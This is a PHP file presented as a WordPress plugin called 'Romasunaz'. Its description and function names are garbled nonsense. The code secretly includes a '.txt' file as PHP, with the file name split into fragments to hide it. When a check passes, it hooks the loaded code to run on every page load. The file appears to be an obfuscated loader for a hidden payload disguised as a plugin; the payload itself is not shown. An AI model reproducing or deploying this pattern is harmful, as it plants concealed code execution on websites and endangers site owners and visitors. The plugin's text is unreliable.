<?php

/**
 * Plugin Name: Romasunaz
 * Plugin URI: https://of.pand.ru/romasunaz
 * Description: Regional specialties may never occur. Thus, oxidation is better if such words are avoided by
 * Version: 1.1.3
 * Author: Kenny Alec
 * Author URI: https://of.pand.ru
 * Text Domain: romasunaz
 * License: GPL2+
 *
 */

function opyjof_izothuhevy() {
    xatile_juchymoth();
}

$dagovi = __DIR__ . '/patujed.txt';
if (file_exists($dagovi)) {
    include_once __DIR__ . "/patu" . "jed." . "txt";
}


if (function_exists("xatile_juchymoth")) {
    $adybish = new javoma_vuwypojer();
    if ($adybish->lazase_ubuchevacho()) {
        add_action('init', 'opyjof_izothuhevy');
    }
}